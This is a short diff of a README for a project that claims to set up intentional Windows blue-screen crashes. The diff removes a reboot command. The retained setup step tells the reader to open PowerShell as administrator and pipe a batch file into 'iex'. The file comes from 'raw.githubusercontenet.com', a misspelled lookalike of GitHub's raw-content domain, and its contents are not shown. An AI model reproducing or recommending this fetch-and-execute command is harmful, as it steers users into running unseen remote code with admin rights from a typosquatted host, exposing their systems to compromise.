@@ -5,7 +5,6 @@ A simple setup for making Windows BSOD intentionally.
 open powershell as admin and run
 ```powershell
 iwr "raw.githubusercontenet.com/ApplePair111/simpleWinBSOD/main/Main.bat" | iex
-shutdown /r /t 0
 ```
 ## to bsod
 while pressing ctrl, double press scroll lock. It will bsod
